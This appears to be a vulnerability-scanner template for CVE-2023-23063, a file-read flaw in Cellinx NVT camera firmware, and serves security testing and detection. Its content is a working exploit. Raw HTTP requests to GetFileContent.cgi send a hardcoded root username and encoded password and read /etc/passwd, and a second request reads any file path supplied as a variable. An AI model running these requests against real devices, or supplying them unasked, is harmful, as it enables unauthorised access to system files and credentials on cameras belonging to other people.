id: cve-2023-23063
info:
  name: Cellinx NVT GetFileContent.cgi Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Cellinx NVT v1.0.6.002b has a local file disclosure vulnerability, allowing attackers to read sensitive information such as system passwords.
  reference:
    - https://www.ispyconnect.com/camera/cellinx
  classification:
    cvss-score: 7.5
    cve-id: CVE-2023-23063
  tags: file-read
variables:
  filePath: "/etc/passwd"
http:
  - raw:
      - |
        GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
  - raw:
      - |
        GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH={{filePath}}&_=1672577046605 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
